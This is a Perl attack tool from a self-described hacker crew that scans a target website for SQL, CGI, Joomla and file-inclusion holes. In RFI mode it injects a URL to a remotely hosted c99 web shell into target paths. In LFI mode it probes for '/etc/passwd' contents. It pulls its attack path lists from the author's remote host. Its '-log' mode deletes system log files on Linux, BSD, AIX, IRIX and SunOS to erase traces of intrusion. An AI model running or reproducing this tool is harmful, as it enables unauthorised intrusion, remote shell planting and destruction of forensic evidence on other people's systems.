#!/usr/bin/perl
#  st4lk3r web vulnerability scan 2
#  Copyright (C) 2008-2009 st4lk3r, c00kies crew
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; version 2
#  of the License only.
#
#  bug report:
#  dr4k3@hackermail.com
#  c0d3rs.tk
#  Brazilian coders
#

use Socket;
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use HTTP::Date;
use LWP::Simple;

$path = $ARGV[0];
$link = $ARGV[1]; if($link !~ /http:\/\//) { $link = "http://$link"; }
$os = $ARGV[2];
$type = $ARGV[3];
$name = $ARGV[4];
$msg_404 = "error 404 command not found";
$msg_nvul = "Not Found";
$msg_sucess = "Vulnerable";
$http_port = "80";
$lfi_rsult_if = "root:x:";
$httpd_scan_start = 0;
$path_scan_start =0;
$cont=0; chomp $cont;
$cmd_rfi_scan = "http://www.freewebs.com/dr4k3/shell/c99.txt";
$trace = '---------------------------------------------------------------';
if($path eq "-s"){ $local_path = "paths/SQL"; chomp $local_path;}
if($path eq "-c"){ $local_path = "paths/CGI"; chomp $local_path;}
if($path eq "-r"){ $local_path = "paths/RFI"; chomp $local_path;}
if($path eq "-j"){ $local_path = "paths/JOOMLA"; chomp $local_path;}
if($path eq "-l"){ $local_path = "paths/LFI"; chomp $local_path;}
if($path eq "-log"){goto log_system;}
if($path eq "-update"){update();}
if($path eq "-info"){info();}
if(@ARGV < 5){header_error();}

sub header_error(){
regex_os();
print "$msg_404\n";
print "$trace\n";
help();
exit;}

sub help(){regex_os();
open (help, "docs/HELP");
while (<help>) {print "$_";}
close help;print "\n";exit;}

sub info(){regex_os();
open (info, "docs/INFO");
while (<info>) {print "$_";}
close info;print "\n";exit;}

sub update(){regex_os();
print "loading repositories[...]\n";sleep 2;
$update_sql = "http://www.freewebs.com/dr4k3/SQL";
$update_rfi = "http://www.freewebs.com/dr4k3/RFI";
$update_lfi = "http://www.freewebs.com/dr4k3/LFI";
$update_joomla = "http://www.freewebs.com/dr4k3/JOOMLA";
$update_cgi = "http://www.freewebs.com/dr4k3/CGI";
$update_sunos = "http://www.freewebs.com/dr4k3/sunos";
$update_other = "http://www.freewebs.com/dr4k3/other";
$update_aix = "http://www.freewebs.com/dr4k3/aix";
$update_bsd = "http://www.freewebs.com/dr4k3/bsd";
$update_irix = "http://www.freewebs.com/dr4k3/irix";
$update_linux = "http://www.freewebs.com/dr4k3/linux";
print "upgrading[...]\n";
$update_sql_get = get("$update_sql");
open(UPDATE, ">paths/SQL"); print UPDATE "$update_sql_get"; close(UPDATE);
$update_rfi_get = get("$update_rfi");
open(UPDATE, ">paths/RFI"); print UPDATE "$update_rfi_get"; close(UPDATE);
$update_lfi_get = get("$update_lfi");
open(UPDATE, ">paths/LFI"); print UPDATE "$update_lfi_get"; close(UPDATE);
$update_joomla_get = get("$update_joomla");
open(UPDATE, ">paths/JOOMLA"); print UPDATE "$update_joomla_get"; close(UPDATE);
$update_cgi_get = get("$update_cgi");
open(UPDATE, ">paths/CGI"); print UPDATE "$update_cgi_get"; close(UPDATE);
$update_sunos_get = get("$update_sunos");
open(UPDATE, ">logs/sunos"); print UPDATE "$update_sunos_get"; close(UPDATE);
$update_other_get = get("$update_other");
open(UPDATE, ">logs/other"); print UPDATE "$update_other_get"; close(UPDATE);
$update_aix_get = get("$update_aix");
open(UPDATE, ">logs/aix"); print UPDATE "$update_aix_get"; close(UPDATE);
$update_bsd_get = get("$update_bsd");
open(UPDATE, ">logs/bsd"); print UPDATE "$update_bsd_get"; close(UPDATE);
$update_irix_get = get("$update_irix");
open(UPDATE, ">logs/irix"); print UPDATE "$update_irix_get"; close(UPDATE);
$update_linux_get = get("$update_linux");
open(UPDATE, ">logs/linux"); print UPDATE "$update_linux_get"; close(UPDATE);
print "update ended[...]\n"; exit;}

sub regex_os(){$sis="$^O";
if ($sis eq "MSwin32"){ $cmd="cls"; system("$cmd");} 
else { $cmd="clear"; system("$cmd"); }}

sub header_sucess(){
if($os eq "-win"){$info_os_header = "winNT";}
if($os eq "-bsd"){$info_os_header = "NetBSD";}
if($os eq "-lnx"){$info_os_header = "Linux";}
if($path eq "-s"){ $type_path_header = SQL;}
if($path eq "-c"){ $type_path_header = CGI;}
if($path eq "-r"){ $type_path_header = RFI;}
if($path eq "-j"){ $type_path_header = JOOMLA;}
if($path eq "-l"){ $type_path_header = LFI;}
if ($type eq "-t"){ $type_log_header = TXT;}
if ($type eq "-h"){ $type_log_header = HTML;}
if ($type eq "-n"){ $type_log_header = NULL;}
$log_name_header = $name;
$host_header = $ARGV[1];
print "Path:            $type_path_header\n";
print "Host:            $host_header\n";
print "Simule[OS]:      $info_os_header\n";
print "Type log:        $type_log_header\n";
print "Name log:        $log_name_header\n";
print "$trace\n";}

sub proxy(){
print "\nWhat proxy: example 200.1.2.0:8080 \n";
print "If you do not want proxy to put: 0 \n";
my $proxy = <STDIN>; chomp $proxy; 
}

sub httpd(){
$host = $link;
$useragent = LWP::UserAgent->new;
$resp = $useragent->head($host);
$httpd_info_resp = $resp->headers_as_string;
print $httpd_info_resp;}

sub tempo(){
my ($data, $time) = split(" ", HTTP::Date::time2iso());
my ($hora, $min,$sec) = split(":", $time);
$log_time = "$data, $hora:$min:$sec";
return $log_time;}
$log_time = tempo();

$site = $ARGV[1];
$ip = inet_ntoa(inet_aton($site));
chomp $ip;

sub save_log(){
if($os eq "-win"){$info_os = "winNT";}
if($os eq "-bsd"){$info_os = "NetBSD";}
if($os eq "-lnx"){$info_os = "Linux";}
if($path eq "-s"){ $type_path = SQL;}
if($path eq "-c"){ $type_path = CGI;}
if($path eq "-r"){ $type_path = RFI;}
if($path eq "-j"){ $type_path = JOOMLA;}
if($path eq "-l"){ $type_path = LFI;}

if ($type eq "-t"){
open(ARQ,">$name.txt");
print ARQ" - st4lk3r wvs v2\n";
print ARQ"$trace\n";
print ARQ" + Target Hostname:   $link\n";
print ARQ" + Target IP:         $ip\n";
print ARQ" + Target Port:       $http_port\n";
print ARQ" + Start Time:        $log_time\n";
print ARQ"$trace\n";
print ARQ" + Path:              $type_path\n";
print ARQ" + Simule:            $info_os\n";}

if ($type eq "-h"){
open(ARQ,">$name.html");
print ARQ" <html>\n";
print ARQ" <head>\n";
print ARQ"<title>log[$name]</title>\n";
print ARQ"</head>\n";
print ARQ"<body>\n";
print ARQ"<pre>\n";
print ARQ" - st4lk3r wvs v2\n";
print ARQ"$trace\n";
print ARQ" + Target Hostname:   $link\n";
print ARQ" + Target IP:         $ip\n";
print ARQ" + Target Port:       $http_port\n";
print ARQ" + Start Time:        $log_time\n";
print ARQ"$trace\n";
print ARQ" + Path:              $type_path\n";
print ARQ" + Simule:            $info_os\n";}

if ($type eq "-n"){
open(ARQ,">$name");
print ARQ" - st4lk3r wvs v2\n";
print ARQ"$trace\n";
print ARQ" + Target Hostname:   $link\n";
print ARQ" + Target IP:         $ip\n";
print ARQ" + Target Port:       $http_port\n";
print ARQ" + Start Time:        $log_time\n";
print ARQ"$trace\n";
print ARQ" + Path:              $type_path\n";
print ARQ" + Simule:            $info_os\n";}}

regex_os();header_sucess();proxy();

print "\npress [enter] to check the version of httpd[...]\n";
$httpd_scan_start =<STDIN>;
httpd();

if($path eq "-s"){ $type_path = SQL;}
if($path eq "-c"){ $type_path = CGI;}
if($path eq "-r"){ $type_path = RFI;}
if($path eq "-j"){ $type_path = JOOMLA;}
if($path eq "-l"){ $type_path = LFI;}

print "\npress [enter] to check the vulnerability in host [$type_path]\n";
$path_scan_start =<STDIN>;

if($path eq "-s"){
open (sql, $local_path) or die "error [$!]";
@sql_vul = <sql>;
close(sql);
for(my $i=0;$i<=$#sql_vul;$i++) {

$url = "$link/$sql_vul[$i]";
$request = HTTP::Request->new(GET=>$url);
$ua = LWP::UserAgent->new();

if($os eq "-bsd"){
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');}
if($os eq "-win"){
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($os eq "-lnx"){
$ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($proxy!=0) {$ua->env_proxy(); 
$ua->proxy("http", "http://$proxy/"); } 
$response = $ua->request($request);
if ($response->is_success) {$msg = Vulnerable; $cont=$cont+1;}
else {$msg = "Not vunerable";}
$link_print = $ARGV[1]; print "$link_print($ip).........[$msg]\n";
save_log();
if ($type eq "-t"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";}

if ($type eq "-h"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
print ARQ"</pre>\n";
print ARQ"</body>\n";
print ARQ"</html>\n";}

if ($type eq "-n"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
}}print "\nwas caught: $cont vulnerabilities in the host: $link_print by: $type_path \n"; 
close ARQ; exit;}
if($path eq "-c"){
open (cgi, $local_path) or die "error [$!]";
@cgi_vul = <cgi>;
close(cgi);

for(my $i=0;$i<=$#cgi_vul;$i++) {

$url = "$link$cgi_vul[$i]";
$request = HTTP::Request->new(GET=>$url);
$ua = LWP::UserAgent->new();

if($os eq "-bsd"){
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');}
if($os eq "-win"){
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($os eq "-lnx"){
$ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($proxy!=0) {$ua->env_proxy(); 
$ua->proxy("http", "http://$proxy/"); } 
$response = $ua->request($request);
if ($response->is_success) {$msg = Vulnerable; $cont=$cont+1;}
else {$msg = "Not vunerable";}

$link_print = $ARGV[1];
print "$link_print($ip).........[$msg]\n";

save_log();
if ($type eq "-t"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";}

if ($type eq "-h"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
print ARQ"</pre>\n";
print ARQ"</body>\n";
print ARQ"</html>\n";}

if ($type eq "-n"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
}}print "\nwas caught: $cont vulnerabilities in the host: $link_print by: $type_path \n"; 
close ARQ; exit;}
if($path eq "-r"){
open (rfi, $local_path) or die "error [$!]";
@rfi_vul = <rfi>;
close(rfi);

for(my $i=0;$i<=$#rfi_vul;$i++) {

$url = "$link/$rfi_vul[$i]$cmd_rfi_scan";
$request = HTTP::Request->new(GET=>$url);
$ua = LWP::UserAgent->new();

if($os eq "-bsd"){
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');}
if($os eq "-win"){
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($os eq "-lnx"){
$ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($proxy!=0) {$ua->env_proxy(); 
$ua->proxy("http", "http://$proxy/"); } 
$response = $ua->request($request);
if ($response->is_success) {$msg = Vulnerable; $cont=$cont+1;}
else {$msg = "Not vunerable";}

$link_print = $ARGV[1];
print "$link_print($ip).........[$msg]\n";

save_log();
if ($type eq "-t"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";}

if ($type eq "-h"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
print ARQ"</pre>\n";
print ARQ"</body>\n";
print ARQ"</html>\n";}

if ($type eq "-n"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
}}print "\nwas caught: $cont vulnerabilities in the host: $link_print by: $type_path \n"; 
close ARQ; exit;}
if($path eq "-l"){
open (lfi, $local_path) or die "error [$!]";
@lfi_vul = <lfi>;
close(lfi);

for(my $i=0;$i<=$#lfi_vul;$i++) {

$url = "$link$lfi_vul[$i]";
$request = HTTP::Request->new(GET=>$url);
$ua = LWP::UserAgent->new();

if($os eq "-bsd"){
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');}
if($os eq "-win"){
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($os eq "-lnx"){
$ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($proxy!=0) {$ua->env_proxy(); 
$ua->proxy("http", "http://$proxy/"); } 
$response = $ua->request($request);
if ($response->is_success && $response->content =~ /root:x:/) {$msg = Vulnerable; $cont=$cont+1;}
else {$msg = "Not vunerable";}

$link_print = $ARGV[1];
print "$link_print($ip).........[$msg]\n";

save_log();
if ($type eq "-t"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";}

if ($type eq "-h"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
print ARQ"</pre>\n";
print ARQ"</body>\n";
print ARQ"</html>\n";}

if ($type eq "-n"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
}}print "\nwas caught: $cont vulnerabilities in the host: $link_print by: $type_path \n"; 
close ARQ; exit;}
if($path eq "-j"){
open (joomla, $local_path) or die "error [$!]";
@joomla_vul = <joomla>;
close(joomla);

for(my $i=0;$i<=$#joomla_vul;$i++) {

$url = "$link/$joomla_vul[$i]";
$request = HTTP::Request->new(GET=>$url);
$ua = LWP::UserAgent->new();

if($os eq "-bsd"){
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');}
if($os eq "-win"){
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($os eq "-lnx"){
$ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20020823 Firefox/2.0.0.12');}
if($proxy!=0) {$ua->env_proxy(); 
$ua->proxy("http", "http://$proxy/"); } 
$response = $ua->request($request);
if ($response->is_success) {$msg = Vulnerable; $cont=$cont+1;}
else {$msg = "Not vunerable";}

$link_print = $ARGV[1];
print "$link_print($ip).........[$msg]\n";

save_log();
if ($type eq "-t"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";}

if ($type eq "-h"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
print ARQ"</pre>\n";
print ARQ"</body>\n";
print ARQ"</html>\n";}

if ($type eq "-n"){
print ARQ" + Vulnerabilits:     $cont\n";
if($cont > 0){$msg_log = Vulnerable;} else{$msg_log = "Not Vulnerable";}
print ARQ" + Status:            $msg_log\n";
print ARQ"$trace\n";
print ARQ"$httpd_info_resp\n";
print ARQ"$trace\n";
}}print "\nwas caught: $cont vulnerabilities in the host: $link_print by: $type_path \n"; 
close ARQ; exit;}

log_system: regex_os();
print "linux\naix\nsunos\nirix\nbsd\nother\n>"; 
chop($system_log = <STDIN>);

if($system_log eq "linux"){ $local_log = "logs/linux";  chomp $local_log;}
if($system_log eq "bsd"){   $local_log = "logs/bsd";    chomp $local_log;}
if($system_log eq "aix"){   $local_log = "logs/aix";    chomp $local_log;}
if($system_log eq "irix"){  $local_log = "logs/irix";   chomp $local_log;}
if($system_log eq "sunos"){ $local_log = "logs/sunos";  chomp $local_log;}
if($system_log eq "other"){ $local_log = "logs/other";  chomp $local_log;}

open(linux, $local_log) or die "error [$!]";
@linux = <linux>;close(linux);
open (bsd, $local_log) or die "error [$!]";
@bsd = <bsd>;close(bsd);
open (aix, $local_log) or die "error [$!]";
@aix = <aix>;close(aix);
open (irix, $local_log) or die "error [$!]";
@irix = <irix>;close(irix);
open (sunos, $local_log) or die "error [$!]";
@sunos = <sunos>;close(sunos);
open (other, $local_log) or die "error [$!]";
@other = <other>;close(other);

if($system_log eq "aix"){
print ">Aix Selected...\n";
foreach $fuck (@aix){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n"; 
}  if($system_log eq "irix"){
print "[>Irix Selected...\n";
foreach $fuck (@irix){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n";
}  if($system_log eq "sunos"){
print ">SunOS Selected...\n"; 
foreach $fuck (@sunos){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n"; 
}  if($system_log eq "linux"){   
print ">Linux Selected...\n";   
foreach $fuck (@linux){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n";
} if($system_log eq "bsd"){
print ">BSD Selected...\n"; 
foreach $fuck (@bsd){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n";
}if($system_log eq "other"){
print ">Other Selected...\n"; 
foreach $fuck (@other){
unlink $fuck or warn "error [$!]\n";}
print ">ended[...]\n";}
  



